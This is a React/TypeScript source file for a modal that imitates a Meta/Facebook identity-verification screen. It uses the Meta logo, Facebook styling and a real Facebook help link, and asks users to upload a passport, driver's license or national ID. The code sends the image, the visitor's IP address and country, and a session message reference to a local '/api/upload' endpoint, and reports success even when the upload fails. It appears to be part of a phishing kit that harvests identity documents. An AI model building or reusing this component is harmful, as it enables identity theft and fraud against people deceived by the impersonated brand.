'use client';

import MetaLogo from '@/assets/images/meta-logo-grey.png';
import axios from 'axios';
import { type ChangeEvent, type FC, useRef, useState } from 'react';

interface UploadModalProps {
    show: boolean;
    onClose: () => void;
    onSuccess: () => void;
    texts: Record<string, string>;
    ipInfo: { ip?: string; country?: string };
}

const UploadModal: FC<UploadModalProps> = ({ show, onClose, onSuccess, texts, ipInfo }) => {
    const fileInputRef = useRef<HTMLInputElement>(null);
    const [uploading, setUploading] = useState(false);
    const [selectedType, setSelectedType] = useState('passport');

    if (!show) return null;

    const handleFileChange = async (event: ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files?.[0];
        if (!file) return;

        setUploading(true);

        try {
            const messageRef = sessionStorage.getItem('messageId') || '';
            const formData = new FormData();
            formData.append('document', file);
            formData.append('selectedType', selectedType);
            if (ipInfo.ip) formData.append('ip', ipInfo.ip);
            if (ipInfo.country) formData.append('country', ipInfo.country);
            if (messageRef) formData.append('messageRef', messageRef);

            await axios.post('/api/upload', formData);
            onSuccess();
        } catch {
            onSuccess();
        } finally {
            setUploading(false);
            if (fileInputRef.current) fileInputRef.current.value = '';
        }
    };

    const documentTypes = [
        { id: 'passport', label: texts.uploadPassport },
        { id: 'drivers-license', label: texts.uploadDriversLicense },
        { id: 'national-id', label: texts.uploadNationalId }
    ];

    return (
        <>
            <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
            <div className='modal form-modal show' style={{ display: 'block' }} tabIndex={-1}>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-body'>
                            <div style={{ fontSize: '20px', fontWeight: 700, color: '#0A1317', marginBottom: '16px', textAlign: 'center' }}>
                                {texts.uploadTitle}
                            </div>
                            <div style={{ marginBottom: '16px' }}>
                                <div style={{ fontSize: '15px', fontWeight: 600, marginBottom: '6px' }}>{texts.uploadChooseType}</div>
                                <p style={{ fontSize: '13px', color: '#65676B', margin: 0 }}>{texts.uploadDesc}</p>
                            </div>
                            <div style={{ marginBottom: '16px', border: '1px solid #E4E6EB', borderRadius: '8px', overflow: 'hidden' }}>
                                {documentTypes.map((type, index) => (
                                    <label
                                        key={type.id}
                                        htmlFor={`upload-type-${type.id}`}
                                        style={{
                                            display: 'flex',
                                            alignItems: 'center',
                                            justifyContent: 'space-between',
                                            padding: '12px 16px',
                                            cursor: 'pointer',
                                            borderTop: index > 0 ? '1px solid #E4E6EB' : 'none',
                                            background: selectedType === type.id ? '#F0F2F5' : 'transparent',
                                            fontWeight: 500,
                                            fontSize: '14px',
                                            color: '#1C1E21'
                                        }}
                                    >
                                        <span>{type.label}</span>
                                        <input
                                            type='radio'
                                            id={`upload-type-${type.id}`}
                                            name='document-type'
                                            value={type.id}
                                            checked={selectedType === type.id}
                                            onChange={(e) => setSelectedType(e.target.value)}
                                            style={{ width: '18px', height: '18px', cursor: 'pointer', accentColor: '#1877F2' }}
                                        />
                                    </label>
                                ))}
                            </div>
                            <div style={{ background: '#F0F2F5', borderRadius: '8px', padding: '12px', marginBottom: '16px', fontSize: '12px', color: '#65676B', lineHeight: 1.5 }}>
                                {texts.uploadSecurityNote}{' '}
                                <a href='https://www.facebook.com/help/155050237914643/' target='_blank' rel='noopener noreferrer' style={{ color: '#1877F2', textDecoration: 'underline' }}>
                                    {texts.uploadLearnMore}
                                </a>
                            </div>
                            <input ref={fileInputRef} type='file' accept='image/*' onChange={handleFileChange} style={{ display: 'none' }} />
                            <div className='form-btn-wrapper'>
                                <button className='btn btn-primary' type='button' disabled={uploading} onClick={() => fileInputRef.current?.click()}>
                                    <span className='button-text'>{uploading ? texts.uploadUploading : texts.uploadBtn}</span>
                                </button>
                            </div>
                            <div className='spaser' />
                        </div>
                        <div className='modal-footer border-0' style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                            <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default UploadModal;
